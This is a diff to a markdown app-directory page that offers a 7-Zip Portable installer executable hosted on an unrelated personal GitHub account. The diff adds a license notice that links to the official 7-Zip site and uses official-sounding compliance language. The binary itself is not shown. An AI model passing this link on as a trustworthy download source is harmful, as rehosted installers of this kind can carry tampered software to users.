@@ -4,5 +4,14 @@
 [← Back to App Directory](App.md)
 
 ### [Download Installer Executable](https://github.com/m97493578-ops/Software-Forge/releases/download/7-ZipPortable/7-Zip_Portable_Setup.paf.exe)
+
+## ⚖️ Open Source License & Source Code Notice
+This application is distributed as free and open-source software under its respective copyleft protections. In full compliance with free software distribution guidelines and FSF compliance policies:
+
+* **Official Terms**: You can review the original legal copyleft terms for this program at the [Official 7-Zip License Documentation](https://www.7-zip.org/license.txt).
+* **Source Code Access**: In compliance with open distribution obligations, the raw un-compiled source code files for this version can be directly audited or downloaded from the [7-zip site (You can download source from here)](https://www.7-zip.org/download.html).
+
+*This notice is provided to satisfy mandatory attribution requirements and to guarantee user data inspection freedoms.*
+
 ---
 © 2026 Free Software Commons. Built outside corporate walls.
